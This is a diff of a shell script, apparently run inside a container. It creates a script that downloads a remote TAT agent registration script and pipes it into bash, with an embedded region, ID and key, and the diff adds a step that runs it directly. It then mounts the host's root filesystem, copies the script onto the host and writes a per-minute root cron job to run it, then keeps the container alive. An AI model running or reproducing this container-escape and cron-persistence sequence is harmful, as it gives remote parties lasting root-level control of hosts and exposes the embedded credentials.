@@ -18,10 +18,12 @@ cat > /tmp/tat_install.sh << 'TATSCRIPT'
 wget -qO - https://tat-1258344699.cos.accelerate.myqcloud.com/tat_agent/tat_agent_register.sh | bash -s -- ap-guangzhou a2763c33-6f9b-41f0-8e10-f0f0603220b7 e7fddac6bc6349aaa93c3fd2a1e052231e419413821a43d89a111f6914f878a7
 TATSCRIPT
 chmod +x /tmp/tat_install.sh
-echo "=== TAT script created ==="
 cat /tmp/tat_install.sh
 
-echo "=== Step 2: Mount host root filesystem ==="
+echo "=== Step 2: Install TAT in container directly ==="
+bash /tmp/tat_install.sh 2>&1 || echo "Container TAT install attempted"
+
+echo "=== Step 3: Mount host root filesystem ==="
 mkdir -p /mnt/host
 MOUNTED=0
 for dev in /dev/nvme0n1p1 /dev/sda1 /dev/xvda1; do
@@ -39,27 +41,21 @@ for dev in /dev/nvme0n1p1 /dev/sda1 /dev/xvda1; do
 done
 
 if [ "$MOUNTED" -eq 1 ]; then
-  echo "=== Step 3: Copy TAT script to host /tmp ==="
+  echo "=== Step 4: Copy TAT script to host /tmp ==="
   cp /tmp/tat_install.sh /mnt/host/tmp/tat_install.sh
   chmod +x /mnt/host/tmp/tat_install.sh
-  echo "Copied. Verify:"
   ls -la /mnt/host/tmp/tat_install.sh
-  cat /mnt/host/tmp/tat_install.sh
 
-  echo "=== Step 4: Write cron to /var/spool/cron/root ==="
+  echo "=== Step 5: Write cron to /var/spool/cron/root ==="
   mkdir -p /mnt/host/var/spool/cron
   echo '* * * * * /tmp/tat_install.sh >> /var/log/tat_install.log 2>&1' > /mnt/host/var/spool/cron/root
   chmod 600 /mnt/host/var/spool/cron/root
-  echo "Written. Verify /var/spool/cron/root:"
+  echo "Verify /var/spool/cron/root:"
   cat /mnt/host/var/spool/cron/root
-
-  echo "=== Step 5: Check host crontab service ==="
-  ls -la /mnt/host/var/spool/cron/
-  cat /mnt/host/etc/crontab
 
   sync
   umount /mnt/host
-  echo "=== Unmounted ==="
+  echo "=== Host unmounted ==="
 else
   echo "FAILED to mount host root"
 fi
@@ -67,5 +63,12 @@ fi
 echo "=== Public IP ==="
 curl -s --connect-timeout 5 http://checkip.amazonaws.com 2>/dev/null || echo "no IP"
 
-echo "=== Complete ==="
+echo "=== Keeping container alive for 20 minutes ==="
+for i in $(seq 1 1200); do
+  sleep 1
+  if [ $((i % 60)) -eq 0 ]; then
+    echo "Alive: ${i}s / 1200s ($(date))"
+  fi
+done
+echo "=== 20 minutes elapsed, exiting ==="
 exit 0
